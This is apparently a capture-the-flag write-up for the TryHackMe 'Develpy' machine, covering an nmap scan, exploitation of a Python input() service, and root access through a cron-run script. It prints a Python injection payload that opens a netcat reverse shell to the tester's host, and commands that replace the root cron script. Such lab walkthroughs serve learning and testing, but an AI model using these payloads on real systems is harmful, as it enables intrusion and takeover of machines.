<img width="397" alt="2024-04-30 17_00_23-TryHackMe _ Develpy — Mozilla Firefox" src="https://github.com/Th3l3mic/WriteUps/assets/167564930/b1f1c599-2414-4763-9cf0-c7faceed8793">

<h2>Develpy is a free boot2root machine created by 
<a href="https://tryhackme.com/p/stuxnet">stuxnet</a>, with medium difficulty level.</h2> 

After deploying machine  start nmap scan:

<img width="391" alt="2024-04-30 17_07_39-THM Browser-Based — Mozilla Firefox" src="https://github.com/Th3l3mic/WriteUps/assets/167564930/3fba4340-a7da-4295-9cee-f0cf74d11e78">


Nmap reveals two ports open:

<code>22 for ssh
10000 for snet-sensor-mgmt</code>

Let's try to find out what it is, and connect it with that port in our browser. 
<p></p>
<img width="550" alt="2024-04-30 17_17_14-THM Browser-Based — Mozilla Firefox" src="https://github.com/Th3l3mic/WriteUps/assets/167564930/915fe513-0874-468f-926b-c3f990ed6bc4">


It looks like some python script is running  behind the scenes.
After connecting via telnet it seems that script is asking us for a number and does some ping requests as many times as We provide.
<p></p>

<img width="417" alt="2024-04-30 17_18_27-THM Browser-Based — Mozilla Firefox" src="https://github.com/Th3l3mic/WriteUps/assets/167564930/23126157-bb1f-4844-a121-3216f8733644">
<p></p>


There's a very helpful article made by 
<a href="https://security.szurek.pl/en/why-you-shouldnt-use-input-function/">Kacper Szurek</a> on how to abuse python input() with incjections, and we prepare payload with reverse shell:

<code>__import__('os').system('nc -e /bin/bash 10.10.192.242 1234')</code>

set netcat listener on port 1234 and go! We've got a shell!

Type ls to list files and We found user's flag! There's also few interesting files in this directory that could potentially give us root. 
Sudo -l didn't work, let's check cronjobs. It seems that every minute root.sh is excecuted with root permissions. 

We can't overwrite this file, but we can remove it and created new one with our reverse shell... just one thing, We must give x permission to this one, set our listener and boom, We're root now!


<img width="535" alt="2024-04-30 18_29_22-THM Browser-Based — Mozilla Firefox" src="https://github.com/Th3l3mic/WriteUps/assets/167564930/7c8e5cc0-f507-4f43-8d8d-b223350ba104">

There's one simplest way to get to root flag:

<code>rm root.sh
echo 'cp /root/root.txt /home/king/root.txt' > root.sh </code>

T.
